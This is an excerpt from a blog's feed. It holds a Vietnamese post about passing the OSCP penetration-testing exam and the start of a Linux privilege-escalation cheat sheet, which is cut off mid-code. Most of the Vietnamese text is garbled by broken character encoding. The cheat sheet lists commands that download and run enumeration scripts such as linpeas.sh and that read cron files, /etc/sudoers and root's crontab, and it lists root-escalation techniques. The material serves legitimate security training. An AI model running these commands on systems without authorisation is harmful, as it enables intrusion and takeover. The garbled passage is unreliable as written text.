<li>HÃ´m nay tÃ´i ngá»“i Ä‘Ã¢y Ä‘á»ƒ viáº¿t nhá»¯ng dÃ²ng suy nghÄ© nÃ y khi tÃ´i vá»«a nháº­n Ä‘Æ°á»£c email thÃ´ng bÃ¡o tÃ´i Ä‘Ã£ vÆ°á»£t qua kÃ¬ thi OSCP cá»§a offensive security.ÄÃ¢y chá»‰ lÃ  má»™t bÃ i viáº¿t Ä‘Æ¡n giáº£n Ä‘á»ƒ tÃ´i cÃ³ thá»ƒ chia sáº» nhá»¯ng suy nghÄ©,cáº£m nháº­n vÃ  hÃ nh trÃ¬nh tÃ´i Ä‘áº¡t Ä‘Æ°á»£t chá»©ng chá»‰ OSCP trong láº§n thi Ä‘áº§u tiá»n . ÄÃ³ lÃ  cáº£ má»™t quÃ¡ trÃ¬nh gian nan, cá»‘ gáº¯ng háº¿t mÃ¬nh cá»§a tÃ´i trong 3 thÃ¡ng.
<img src="https://raw.githubusercontent.com/tranquac/OSCP-Journey/main/pass.png" alt=""></li>
</ul>
<h2 id="oscp-lÃ -gÃ¬">OSCP lÃ  gÃ¬?</h2>
<ul>
<li>OSCP laÌ€ moÌ£Ì‚t chuÌ›oÌ›ng triÌ€nh chuÌ›Ìng chiÌ‰ maÌ€ taÌ£Ì‚p trung vaÌ€o nhuÌ›Ìƒng kyÌƒ naÌ†ng taÌ‚Ìn coÌ‚ng vaÌ€ kieÌ‚Ì‰m thuÌ›Ì‰ baÌ‰o maÌ£Ì‚t. NoÌ bao goÌ‚Ì€m 2 phaÌ‚Ì€n: moÌ£Ì‚t baÌ€i thi pentest trong voÌ€ng 23h45p. KeÌ‚Ìt quaÌ‰ thi sau Ä‘oÌ phaÌ‰i Ä‘uÌ›oÌ›Ì£c vieÌ‚Ìt thaÌ€nh baÌo caÌo baÌ†Ì€ng TieÌ‚Ìng Anh, thaÌ‚Ì‰m Ä‘iÌ£nh trong 7 ngaÌ€y truÌ›oÌ›Ìc khi chiÌnh thuÌ›Ìc coÌ‚ng boÌ‚Ì keÌ‚Ìt quaÌ‰.</li>
<li>ChuÌ›Ìng chiÌ‰ OSCP naÌ†Ì€m trong TOP 5 chuÌ›Ìng chiÌ‰ thaÌ‚m nhaÌ£Ì‚p vaÌ€ kieÌ‚Ì‰m thuÌ›Ì‰ Ä‘aÌng moÌ› uÌ›oÌ›Ìc cho caÌc chuyeÌ‚n gia baÌ‰o maÌ£Ì‚t vaÌ€ laÌ€ moÌ£Ì‚t trong nhuÌ›Ìƒng chuÌ›Ìng chiÌ‰ Ä‘oÌ€i hoÌ‰iphaÌ‚Ì€n thi thuÌ›Ì£c haÌ€nh. TaÌ£i kyÌ€ thi, caÌc kyÌƒ suÌ› phaÌ‰i theÌ‚Ì‰ hieÌ£Ì‚n khaÌ‰ naÌ†ng nghieÌ‚n cuÌ›Ìu heÌ£Ì‚ thoÌ‚Ìng maÌ£ng, phaÌt hieÌ£Ì‚n caÌc loÌ‚Ìƒ hoÌ‚Ì‰ng hay Ä‘ieÌ‚Ì‰m yeÌ‚Ìu veÌ‚Ì€ baÌ‰o maÌ£Ì‚t trong heÌ£Ì‚ thoÌ‚Ìng uÌ›Ìng duÌ£ng tuÌ›Ì€ Ä‘oÌ giuÌp caÌc chuyeÌ‚n gia Ä‘aÌnh giaÌ Ä‘uÌ›oÌ›Ì£c muÌ›Ìc Ä‘oÌ£Ì‚ ruÌ‰i ro cuÌƒng nhuÌ› xaÌ‚y duÌ›Ì£ng caÌc phuÌ›oÌ›ng phaÌp uÌ›Ìng phoÌ vaÌ€ khaÌ†Ìc phuÌ£c suÌ›Ì£ coÌ‚Ì.CoÌ theÌ‚Ì‰ noÌi, Ä‘aÌnh giaÌ quan troÌ£ng nhaÌ‚Ìt trong kyÌ€ thi chiÌnh laÌ€ tuÌ› duy nhaÌ£y beÌn vaÌ€ kyÌƒ naÌ†ng thuÌ›Ì£c thi duÌ›oÌ›Ìi aÌp luÌ›Ì£c loÌ›Ìn.</li>
</ul>
<h2 id="táº¡i-sao-tÃ´i-láº¡i-Ä‘Äƒng-kÃ­-oscp">Táº¡i sao tÃ´i láº¡i Ä‘Äƒng kÃ­ OSCP?</h2>
<ul>
<li>Äáº§u tiÃªn lÃ  Ä‘á»ƒ há»c há»i nÃ¢ng cao kiáº¿n thá»©c láº«n kÄ© nÄƒng vá» kiá»ƒm thá»­ báº£o máº­t, hacking cá»™ng vá»›i Ä‘Ã³ lÃ  lÃ²ng quyáº¿t tÃ¢m, niá»m Ä‘am mÃª trong tÃ´i.</li>
<li>Thá»© 2 lÃ  vÃ¬ cÃ´ng viá»‡c.                                                                                                                                                          - Thá»© 3 lÃ  tÄƒng lÆ°Æ¡ng thÃ¬ chÃºng ta khÃ´ng nÃ³i Ä‘áº¿n á»Ÿ Ä‘Ã¢y nhÃ© :)))</li>
</ul>
<h2 id="giai-Ä‘oáº¡n-Ä‘Äƒng-kÃ­-há»c-vÃ -chuáº©n-bá»‹">Giai Ä‘oáº¡n Ä‘Äƒng kÃ­ há»c vÃ  chuáº©n bá»‹</h2>
<ul>
<li>Äá»ƒ thi báº¡n pháº£i tráº£i qua khÃ³a há»c PWK (PENETRATION TESTING WITH KALI LINUX), nÃ³ cÃ³ 3 sá»± lá»±a chá»n: 30,60 hoáº·c 90 ngÃ y. Äáº¿n thá»i Ä‘iá»ƒm hiá»‡n táº¡i offensive Ä‘Ã£ tung ra gÃ³i má»›i cÃ³ thá»i gian 1 nÄƒm vá»›i giÃ¡ 2147$. LÃºc Ä‘Ã³ tÃ´i Ä‘Ã£ lá»±a chá»n gÃ³i 90 ngÃ y vá»›i giÃ¡ 1350$.</li>
<li>Khi Ä‘Äƒng kÃ­ báº¡n sáº½ nháº­n Ä‘Æ°á»£c nhá»¯ng tÃ i liá»‡u: má»™t sÃ¡ch lÃ½ thuyáº¿t 800 trang, má»™t bá»™ video (kiáº¿n thá»©c cÅ©ng tÆ°Æ¡ng tá»± nhÆ°ng khÃ´ng kÄ© báº±ng sÃ¡ch), má»™t gÃ³i káº¿t ná»‘i tá»›i VPN cá»§a há» vÃ  Ä‘Ã¢y cÅ©ng chÃ­nh lÃ  thá»© giÃ¡ trá»‹ nháº¥t mÃ  chÃºng ta cÃ³ thá»ƒ thá»±c hÃ nh vÃ  rÃ¨n luyá»‡n.</li>
<li>TÃ´i báº¯t Ä‘áº§u Ä‘Äƒng kÃ­ há»c chÃ­nh thá»©c lÃ  vÃ o 26 táº¿t. Khi Ä‘Ã³ gáº§n vá»›i kÃ¬ nghá»‰ Táº¿t NguyÃªn ÄÃ¡n. Do á»Ÿ quÃª Táº¿t Ä‘áº¿n cÅ©ng khÃ¡ nhiá»u viá»‡c, báº­n rá»™n nÃªn trong khoáº£ng thá»i gian 20 ngÃ y Ä‘áº§u tÃ´i chá»‰ Ä‘á»c sÃ¡ch mÃ  cÅ©ng khÃ´ng thá»±c hÃ nh Ä‘Æ°á»£c gÃ¬ máº¥y. Qua Ä‘á»£t nghá»‰ Táº¿t vÃ  Ä‘á»c hÃ²m hÃ²m sÃ¡ch lÃ½ thuyáº¿t tÃ´i báº¯t Ä‘áº§u thá»±c hÃ nh. TÃ´i báº¯t Ä‘áº§u vá»›i 2 mÃ¡y alpha vÃ  beta vÃ  tÃ´i khuyÃªn cÃ¡c báº¡n cÅ©ng nÃªn báº¯t Ä‘áº§u tá»« 2 mÃ¡y nÃ y. VÃ¬ Ä‘Ã¢y lÃ  2 mÃ¡y duy nháº¥t offensive hÆ°á»›ng dáº«n Ä‘áº§y Ä‘á»§ Ä‘á»ƒ chÃºng ta cÃ³ thá»ƒ tham kháº£o.</li>
<li>TÃ´i khuyÃªn tháº­t sá»± trÆ°á»›c khi Ä‘Äƒng kÃ­ báº¡n cÅ©ng nÃªn chuáº©n bá»‹ tinh tháº§n cÅ©ng nhÆ° kiáº¿n thá»©c phÃ¹ hÆ¡p, náº¿u khÃ´ng báº¡n sáº½ bá»‹ ngá»£p, choÃ¡ng vá»›i lÆ°á»£ng kiáº¿n thá»©c mÃ  báº¡n sáº½ Ä‘Æ°á»£c tiáº¿p xÃºc. VÃ  tÃ´i nghÄ© Ä‘Ã¢y khÃ´ng pháº£i lÃ  khÃ³a há»c dÃ nh cho ngÆ°á»i má»›i báº¯t Ä‘áº§u (theo quan Ä‘iá»ƒm cá»§a tÃ´i).</li>
<li>CÃ³ thá»ƒ tÃ´i sáº½ liá»‡t kÃª má»™t sá»‘ kiáº¿n thá»©c sáº½ lÃ  cáº§n thiáº¿t cho báº¡n:
<ul>
<li>Há»‡ Ä‘iá»u hÃ nh Linux vÃ  Windows. Báº¡n nÃªn quen thuá»™c vá»›i cáº£ 2 loáº¡i. Äáº·c biáº¿t lÃ  linux. Báº¡n nÃªn thÃ nh tháº¡o vá»›i viá»‡c sá»­ dá»¥ng terminal, command trÃªn linux vÃ¬ nÃ³ lÃ  cÃ¡i chÃºng ta sáº½   sá»­ dá»¥ng chÃ­nh cho viá»‡c lÃ m lab vÃ  kÃ¬ thi.</li>
</ul>
<ul>
<li>cÃ¡c ká»¹ nÄƒng láº­p trÃ¬nh Ä‘á»ƒ cÃ³ thá»ƒ Ä‘á»c hiá»ƒu khai thÃ¡c vÃ  modify tÃ¹y vÃ o trÆ°á»ng há»£p. CÃ¡c khai thÃ¡c chá»§ yáº¿u Ä‘Æ°á»£c viáº¿t báº±ng python,perl&hellip;Báº¡n khÃ´ng cáº§n viáº¿t má»™t khai thÃ¡c cho má»™t   bÃ i toÃ¡n cá»¥ thá»ƒ nhÆ°ng báº¡n sáº½ cáº§n hiá»ƒu nÃ³ vÃ  tÃ¹y chá»‰nh nÃ³.</li>
<li>CÃ¡c web attack vector phá»• biáº¿n nhÆ°: SQLi, Command Injection, LFI, RFI, Upload File&hellip;</li>
<li>ÄÃ£ tá»«ng thá»±c hÃ nh vá»›i labs lÃ  má»™t lá»£i tháº¿. Báº¡n cÃ³ thá»ƒ lÃ m cÃ¡c labs trÃªn hackthebox, tryhackme, vulnhub trÆ°á»›c khi Ä‘áº¿n vá»›i PWK. TrÆ°á»›c khi Ä‘áº¿n vá»›i khÃ³a há»c tÃ´i cÅ©ng thá»±c hÃ nh     Ä‘Æ°á»£c má»™t Ã­t trÃªn cÃ¡c ná»n táº£ng nÃ y nhÆ°ng khÃ´ng Ä‘Æ°á»£c nhiá»u láº¯m. á» Ä‘Ã¢y cÃ³ má»™t list cÃ¡c bÃ i trÃªn hackthebox vÃ  vulnhub like OSCP cá»§a TJNULL. Náº¿u hoÃ n thÃ nh nÃ³ háº¿t trÆ°á»›c khi lÃ m     lab OSCP. Báº¡n cháº¯c cháº¯n sáº½ tá»± tin hÆ¡n tÃ´i nhiá»u:                                                                                            <br>
<a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159</a></li>
<li>Cuá»‘i cÃ¹ng má»™t sá»‘ cÃ´ng cá»¥ mÃ  báº¡n khÃ´ng thá»ƒ khÃ´ng biáº¿t sá»­ dá»¥ng: nmap, burpsuite, nc, metasploit &hellip;</li>
</ul>
</li>
</ul>
<h2 id="ghi-chÃ©p">Ghi chÃ©p</h2>
<ul>
<li>TÃ´i rÃ nh riÃªng má»™t má»¥c Ä‘á»ƒ nÃ³i vá» Ä‘iá»u nÃ y vÃ¬ thá»±c sá»± nÃ³ ráº¥t quan trá»ng. TÃ´i khuyÃªn báº¡n nÃªn note cáº©n tháº­n háº¿t láº¡i táº¥t cáº£ nhá»¯ng gÃ¬ báº¡n há»c Ä‘Æ°á»£c, nghiÃªn cá»©u Ä‘Æ°á»£c trong suá»‘t quÃ¡ trÃ¬nh há»c táº­p, thá»±c hÃ nh. NÃ³ thá»±c sá»± giÃºp báº¡n nhá»› lÃ¢u hÆ¡n vÃ  báº¡n sáº½ biáº¿t tÃ¬m láº¡i khi gáº·p má»™t bÃ i toÃ¡n tÆ°Æ¡ng tá»± hoáº·c quÃªn cháº³ng háº¡n.</li>
<li>KhÃ´ng chá»‰ lÃ½ thuyáº¿t báº¡n hÃ£y note láº¡i toÃ n bá»™ quÃ¡ trÃ¬nh báº¡n lÃ m lab. HÃ£y ghi rÃµ quÃ¡ trÃ¬nh báº¡n lÃ m, cÃ¡ch giáº£i quyáº¿t má»—i khi gáº·p lá»—i,&hellip;NÃ³ sáº½ ráº¥t há»¯u Ã­ch Ä‘Ã³.</li>
<li>TÃ´i cÃ³ cáº£ má»™t kho vá» nhá»¯ng Ä‘iá»u Ä‘Ã³:
<img src="https://raw.githubusercontent.com/tranquac/OSCP-Journey/main/Capture.png" alt="">
<img src="https://raw.githubusercontent.com/tranquac/OSCP-Journey/main/Capture2.png" alt=""></li>
</ul>
<h2 id="kÃ¬-thi">KÃ¬ thi</h2>
<ul>
<li>TÃ­nh Ä‘áº¿n thá»i Ä‘iá»ƒm trÆ°á»›c khi vÃ  kÃ¬ thi tÃ´i Ä‘Ã£ hoÃ n thÃ nh tá»•ng cá»™ng 53 machine trÃªn tá»•ng sá»‘ khoáº£ng 60 machine, pháº§n cÃ²n láº¡i chá»§ yáº¿u lÃ  táº¥n cÃ´ng active directory vÃ¬ khÃ´ng cÃ³ trong kÃ¬ thi nÃªn tÃ´i Ä‘Ã£ quyáº¿t Ä‘á»‹nh lÃ m nÃ³ sau kÃ¬ thi cá»§a mÃ¬nh. VÃ  bÃ¢y giá» thÃ¬ sáºµn sÃ ng rá»“i. Báº¯t Ä‘áº§u lÃªn thá»›t thÃ´i!</li>
<li>KÃ¬ thi OSCP gá»“m cÃ³ 5 machine trong Ä‘Ã³ cÃ³:                                                                                                                            <br>
1 mÃ¡y buffer overflow 25 Ä‘iá»ƒm.                                                                                                                                                    1 mÃ¡y 25 Ä‘iá»ƒm.                                                                                                                                                                    2 mÃ¡y 20 Ä‘iá»ƒm.                                                                                                                                                                    1 mÃ¡y 10 Ä‘iá»ƒm.</li>
<li>Báº¡n lÃ m sao lÃ m Ä‘Æ°á»£c 70 Ä‘iá»ƒm lÃ  Ä‘á»§ Ä‘iá»ƒm pass. NhÆ°ng sau Ä‘Ã³ báº¡n pháº£i lÃ m report vá» quÃ¡ trÃ¬nh mÃ¬nh lÃ m gá»­i cho offensive trong 24h sau Ä‘Ã³.</li>
<li>TÃ´i Ä‘Ã£ Ä‘áº·t lá»‹ch thi vÃ o 11h ngÃ y 25/4/2021. Do máº¡ng phÃ²ng trá» khÃ´ng á»•n Ä‘á»‹nh nÃªn tÃ´i Ä‘Ã£ lÃªn cÃ´ng ty thi. VÃ  may máº¯n trong ngÃ y hÃ´m Ä‘Ã³ tÃ´i khÃ´ng gáº·p váº¥n Ä‘á» vá» máº¡ng cÅ©ng nhÆ° lá»—i kÄ© thuáº­t.                                                                                                                                                               <br>
10h45-&gt;11h30 -&gt; thá»i gian xÃ¡c thá»±c trÆ°á»›c khi thi.                                                                                                                   <br>
11h30-&gt;~7h tá»‘i tÃ´i Ä‘Ã£ hoÃ n thÃ nh 4 machine. ÄÆ°á»£c tá»•ng cá»™ng 80Ä‘.                                                                                                      <br>
7h   -&gt;7h30 tÃ´i cÃ³ má»™t bÃ¡t bÃºn bÃ² lÃ m áº¥m lÃ²ng.                                                                                                               <br>
7h30 -&gt;12h tÃ´i cá»‘ gáº¯ng khai thÃ¡c mÃ¡y cuá»‘i cÃ¹ng nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£ gÃ¬. NÃ³ quÃ¡ khÃ³ nhai.                                                                           <br>
12h  -&gt;3h thá»i gian Ä‘á»ƒ ngá»§.                                                                                                                                                       3h   -&gt; Ä‘Ã¡nh rÄƒng, rá»­a máº·t, vá»‡ sinh cÃ¡ nhÃ¢n.                                                                                                          <br>
3h30 -&gt; 7h sÃ¡ng tÃ´i tiáº¿p tá»¥c cho mÃ¡y cuá»‘i cÃ¹ng nhÆ°ng váº«n khÃ´ng nháº­n láº¡i Ä‘Æ°á»£c káº¿t quáº£ gÃ¬ máº·c dÃ¹ tÃ´i Ä‘Ã£ biáº¿t chÃ­nh xÃ¡c CVE cho á»©ng dá»¥ng trÃªn mÃ¡y Ä‘Ã³.           <br>
7h   -&gt;7h30 kiá»ƒm tra láº¡i vÃ  káº¿t thÃºc cho kÃ¬ thÃ¬.</li>
<li>TÃ´i Ä‘Ã£ káº¿t thÃºc sá»›m khoáº£ng 4 tiáº¿ng. VÃ¬ tÃ´i Ä‘Ã£ máº¥t khoáº£ng 10h cho mÃ¡y Ä‘Ã³ nhÆ°ng khÃ´ng nháº­n láº¡i Ä‘Æ°á»£c gÃ¬. TÃ´i quyáº¿t Ä‘á»‹nh ra vá» vÃ  viáº¿t report cho bÃ i thi cá»§a mÃ¬nh.</li>
</ul>
<h2 id="lá»i-káº¿t">Lá»i káº¿t</h2>
<ul>
<li>HÃ nh trÃ¬nh cá»§a tÃ´i lÃ  nhÆ° váº­y Ä‘Ã³. Suá»‘t 3 thÃ¡ng cá»‘ gáº¯ng, cuá»‘i cÃ¹ng tÃ´i Ä‘Ã£ Ä‘Æ°á»£c Ä‘á»n Ä‘Ã¡p báº±ng káº¿t quáº£ xá»©ng Ä‘Ã¡ng. 3 thÃ¡ng Ä‘Ã³ quáº£ lÃ  má»™t quÃ£ng thá»i gian tÃ´i Ä‘Ã£ vÆ°á»£t quÃ¡ giá»›i háº¡n cá»§a báº£n thÃ¢n: Ã´n thi OSCP, há»c vÃ  kiá»ƒm tra trÃªn trÆ°á»ng, tÃ´i Ä‘Ã£ Ä‘i lÃ m cáº£ ngÃ y (bao gá»“m cáº£ lÃ m cÃ´ng viá»‡c á»Ÿ cÃ´ng ty, Ã´n thi) vÃ  tá»‘i trá»Ÿ láº¡i trÆ°á»ng Ä‘á»ƒ há»c trÃªn. Thá»i gian biá»ƒu cá»§a tÃ´i trong 3 thÃ¡ng Ä‘Ã³ nhÆ° má»™t vÃ²ng láº·p : ngÃ y Ä‘i lÃ m, tá»‘i vá» Ä‘i há»c, khoáº£ng 9h15 vá» Ä‘áº¿n nhÃ , lÃ m viá»‡c hoáº·c lÃ m labs oscp Ä‘áº¿n khoáº£ng 12h-1h Ä‘i ngá»§ vÃ  hÃ´m sau láº¡i láº·p láº¡i. ÄÃ³ quáº£ lÃ  quÃ£ng thá»i gian Ä‘Ã¡ng nhá»› cho sá»± cá»‘ gáº¯ng cá»§a tÃ´i!</li>
<li>Hi vá»ng Ä‘Ã¢y khÃ´ng pháº£i bÃ i viáº¿t cuá»‘i cÃ¹ng, vÃ  tÃ´i sáº½ khÃ´ng dá»«ng láº¡i á»Ÿ Ä‘Ã³, sáº½ cá»‘ gáº¯ng cho nhá»¯ng Ä‘ang dá»± Ä‘á»‹nh cÃ²n dang dá»Ÿ, cÃ²n ráº¥t nhiá»u thá»© cáº§n há»c há»i á»Ÿ phÃ­a trÆ°á»›c.</li>
<li>Cuá»‘i cÃ¹ng tÃ´i gá»­i lá»i cáº£m Æ¡n nhá»¯ng ngÆ°á»i báº¡n, Ä‘á»“ng nghiá»‡p Ä‘Ã£ giÃºp Ä‘á»¡ tÃ´i, cÃ¹ng tÃ´i cá»‘ gáº¯ng trong suá»‘t quÃ£ng thá»i gian Ä‘Ã³: aishe, catmandx, minhnq22, ewind!</li>
</ul>
<h2 id="update">Update</h2>
<ul>
<li>VÃ o 03-06-2021 tÃ´i Ä‘Ã£ nháº­n Ä‘Æ°á»£c chá»©ng chá»‰ cá»§a mÃ¬nh. Tháº­t sá»± vui má»«ng!
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cert/OSCP-Cert.jpg" alt=""></li>
</ul>
<h2 id="Ä‘Ã¢y-lÃ -má»™t-sá»‘-nguá»“n-cá»±c-kÃ¬-há»¯u-Ã­ch-tÃ´i-Ä‘Ã£-tham-kháº£o-vÃ -há»c-táº­p-cho-kÃ¬-thi">ÄÃ‚Y LÃ€ Má»˜T Sá» NGUá»’N Cá»°C KÃŒ Há»®U ÃCH TÃ”I ÄÃƒ THAM KHáº¢O VÃ€ Há»ŒC Táº¬P CHO KÃŒ THI:</h2>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>                                             <br>
<a href="https://guide.offsecnewbie.com/">https://guide.offsecnewbie.com/</a>                                                                     <br>
<a href="https://sushant747.gitbooks.io/total-oscp-guide/content/">https://sushant747.gitbooks.io/total-oscp-guide/content/</a>                                   <br>
<a href="https://cd6629.gitbook.io/ctfwriteups/oscp-cheatsheet-unfinished">https://cd6629.gitbook.io/ctfwriteups/oscp-cheatsheet-unfinished</a>                               <br>
<a href="https://blog.adithyanak.com/">https://blog.adithyanak.com/</a>                                                                                                                  <br>
<a href="https://github.com/tranquac/Linux-Privilege-Escalation">https://github.com/tranquac/Linux-Privilege-Escalation</a>                                          <br>
<a href="https://github.com/tranquac/OSCP-PWK-Notes-Public">https://github.com/tranquac/OSCP-PWK-Notes-Public</a>                                                               <br>
<a href="https://burmat.gitbook.io/security/">https://burmat.gitbook.io/security/</a>                                                                                                                   <br>
<a href="https://guif.re/linuxeop#Post%20exploitation">https://guif.re/linuxeop#Post%20exploitation</a></p>
<h4 id="cáº£m-Æ¡n-cÃ¡c-báº¡n-Ä‘Ã£-Ä‘á»c-Ä‘áº¿n-Ä‘Ã¢y">Cáº£m Æ¡n cÃ¡c báº¡n Ä‘Ã£ Ä‘á»c Ä‘áº¿n Ä‘Ã¢y!</h4>
]]></content>
        </item>
        
        <item>
            <title>Linux Privilege Escalation</title>
            <link>https://tranquac.github.io/posts/2021/03/linux-privilege-escalation/</link>
            <pubDate>Thu, 18 Mar 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/03/linux-privilege-escalation/</guid>
            <description>Linux-Privilege-Escalation Synthesize, supplement from a number of other resources Editing and addition: TranQuac Summary  Tools Scheduled tasks  Cron jobs Systemd timers   PATH Variables SUID  Find SUID binaries Exploitation Create a SUID binary   Capabilities  List capabilities of binaries Edit capabilities Interesting capabilities   SUDO  Allow Root Privilege to Binary commands Allow Root Privilege to Shell Script Allow Sudo Right to other Programs LD_PRELOAD Doas sudo_inject CVE-2019-14287   GTFOBins Wildcard Writable files  Writable /etc/passwd Writable /etc/sudoers   Exploiting Services  Services manual enumeration Automatic enumeration Port forwarding   NFS Root Squashing Shared Library  ldconfig RPATH   Groups  Docker LXC/LXD   Kernel Exploits  CVE-2016-5195 (DirtyCow) CVE-2010-3904 (RDS) CVE-2010-4258 (Full Nelson) CVE-2012-0056 (Mempodipper) LIST KERNEL    Tools There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.</description>
            <content type="html"><![CDATA[<h1 id="linux-privilege-escalation">Linux-Privilege-Escalation</h1>
<h2 id="synthesize-supplement-from-a-number-of-other-resources">Synthesize, supplement from a number of other resources</h2>
<h2 id="editing-and-addition-tranquac">Editing and addition: TranQuac</h2>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#tools">Tools</a></li>
<li><a href="#scheduled-tasks">Scheduled tasks</a>
<ul>
<li><a href="#cron-jobs">Cron jobs</a></li>
<li><a href="#systemd-timers">Systemd timers</a></li>
</ul>
</li>
<li><a href="#path-variables">PATH Variables</a></li>
<li><a href="#suid">SUID</a>
<ul>
<li><a href="#find-suid-binaries">Find SUID binaries</a></li>
<li><a href="#exploitation-suid">Exploitation</a></li>
<li><a href="#create-a-suid-binary">Create a SUID binary</a></li>
</ul>
</li>
<li><a href="#capabilities">Capabilities</a>
<ul>
<li><a href="#list-capabilities-of-binaries">List capabilities of binaries</a></li>
<li><a href="#edit-capabilities">Edit capabilities</a></li>
<li><a href="#interesting-capabilities">Interesting capabilities</a></li>
</ul>
</li>
<li><a href="#sudo">SUDO</a>
<ul>
<li><a href="#allow-root-privilege-to-binary-commands">Allow Root Privilege to Binary commands</a></li>
<li><a href="#allow-root-privilege-to-shell-script">Allow Root Privilege to Shell Script</a></li>
<li><a href="#allow-sudo-right-to-other-programs">Allow Sudo Right to other Programs</a></li>
<li><a href="#ld_preload">LD_PRELOAD</a></li>
<li><a href="#doas">Doas</a></li>
<li><a href="#sudo_inject">sudo_inject</a></li>
<li><a href="#cve-2019-14287">CVE-2019-14287</a></li>
</ul>
</li>
<li><a href="#gtfobins">GTFOBins</a></li>
<li><a href="#wildcard">Wildcard</a></li>
<li><a href="#writable-files">Writable files</a>
<ul>
<li><a href="#writable-etcpasswd">Writable /etc/passwd</a></li>
<li><a href="#writable-etcsudoers">Writable /etc/sudoers</a></li>
</ul>
</li>
<li><a href="#exploiting-services">Exploiting Services</a>
<ul>
<li><a href="#services-manual-enumeration">Services manual enumeration</a></li>
<li><a href="automatic-enumeration">Automatic enumeration</a></li>
<li><a href="port-forwarding">Port forwarding</a></li>
</ul>
</li>
<li><a href="#nfs-root-squashing">NFS Root Squashing</a></li>
<li><a href="#shared-library">Shared Library</a>
<ul>
<li><a href="#ldconfig">ldconfig</a></li>
<li><a href="#rpath">RPATH</a></li>
</ul>
</li>
<li><a href="#groups">Groups</a>
<ul>
<li><a href="#docker">Docker</a></li>
<li><a href="#lxclxd">LXC/LXD</a></li>
</ul>
</li>
<li><a href="#kernel-exploits">Kernel Exploits</a>
<ul>
<li><a href="#CVE-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></li>
<li><a href="#%5BCVE-2010-3904-rds">CVE-2010-3904 (RDS)</a></li>
<li><a href="#CVE-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</a></li>
<li><a href="#CVE-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</a></li>
<li><a href="#LIST">LIST KERNEL</a></li>
</ul>
</li>
</ul>
<h2 id="tools">Tools</h2>
<p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.
Here are a few:</p>
<ul>
<li>
<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS - Linux Privilege Escalation Awesome Script</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">wget <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh&#34;</span> -O linpeas.sh
curl <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh&#34;</span> -o linpeas.sh
./linpeas.sh -a <span style="color:#75715e">#all checks - deeper system enumeration, but it takes longer to complete.</span>
./linpeas.sh -s <span style="color:#75715e">#superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.</span>
./linpeas.sh -P <span style="color:#75715e">#Password - Pass a password that will be used with sudo -l and bruteforcing other users</span>
</code></pre></div></li>
<li>
<p><a href="https://github.com/diego-treitos/linux-smart-enumeration">LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">wget <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&#34;</span> -O lse.sh
curl <span style="color:#e6db74">&#34;https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh&#34;</span> -o lse.sh
./lse.sh -l1 <span style="color:#75715e"># shows interesting information that should help you to privesc</span>
./lse.sh -l2 <span style="color:#75715e"># dump all the information it gathers about the system</span>
</code></pre></div></li>
<li>
<p><a href="https://github.com/rebootuser/LinEnum">LinEnum - Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
</code></pre></div></li>
<li>
<p><a href="https://github.com/AlessandroZ/BeRoot">BeRoot - Privilege Escalation Project - Windows / Linux / Mac</a></p>
</li>
<li>
<p><a href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker.py - a Linux Privilege Escalation Check Script</a></p>
</li>
<li>
<p><a href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check</a></p>
</li>
<li>
<p><a href="https://github.com/TH3xACE/SUDO_KILLER">Privilege Escalation through sudo - Linux</a></p>
</li>
</ul>
<h2 id="scheduled-tasks">Scheduled tasks</h2>
<h3 id="cron-jobs">Cron jobs</h3>
<p>Check if you have access with write permission on these files.<br>
Check inside the file, to find other paths with write permissions.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cat /etc/crontab
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
